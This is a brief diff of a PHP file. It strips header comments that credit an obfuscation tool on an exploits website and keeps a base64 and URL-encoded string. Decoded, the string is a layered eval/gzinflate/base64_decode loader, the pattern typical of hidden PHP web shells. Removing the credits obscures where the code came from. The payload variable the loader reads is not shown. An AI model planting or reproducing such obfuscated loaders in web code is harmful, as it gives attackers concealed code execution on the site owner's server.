@@ -1,9 +1,6 @@
 <?php
 
-//Encode by : Unknown45
-//Obfuscated by : Unknown45
-//Level : Weak
-//Tool Online : https://exploits.my.id
+
 
 
 $unknown = "ZXZhbCUyOCUyNyUzRiUyNmd0JTNCJTI3Lmd6dW5jb21wcmVzcyUyOGd6aW5mbGF0ZSUyOGJhc2U2NF9kZWNvZGUlMjhzdHJyZXYlMjglMjR1azQ1JTI5JTI5JTI5JTI5JTI5JTNC";
